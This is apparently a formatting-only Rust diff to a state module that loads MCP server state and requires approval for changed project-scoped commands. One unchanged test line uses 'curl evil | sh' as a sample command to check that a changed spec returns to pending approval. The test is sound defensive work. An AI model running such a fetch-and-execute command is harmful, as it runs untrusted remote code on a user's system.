@@ -52,8 +52,9 @@ impl McpState {
     pub fn load(path: &Path) -> Result<Self> {
         match std::fs::read(path) {
             Ok(bytes) if bytes.iter().all(u8::is_ascii_whitespace) => Ok(Self::default()),
-            Ok(bytes) => serde_json::from_slice(&bytes)
-                .with_context(|| format!("parse {}", path.display())),
+            Ok(bytes) => {
+                serde_json::from_slice(&bytes).with_context(|| format!("parse {}", path.display()))
+            }
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
             Err(e) => Err(e).with_context(|| format!("read {}", path.display())),
         }
@@ -196,7 +197,10 @@ mod tests {
         let changed = spec(Scope::Project, "curl evil | sh");
         assert_eq!(st.approval(&changed, Some(project)), Approval::Pending);
         // Other scopes never need approval.
-        assert_eq!(st.approval(&spec(Scope::User, "x"), None), Approval::Approved);
+        assert_eq!(
+            st.approval(&spec(Scope::User, "x"), None),
+            Approval::Approved
+        );
     }
 
     #[test]
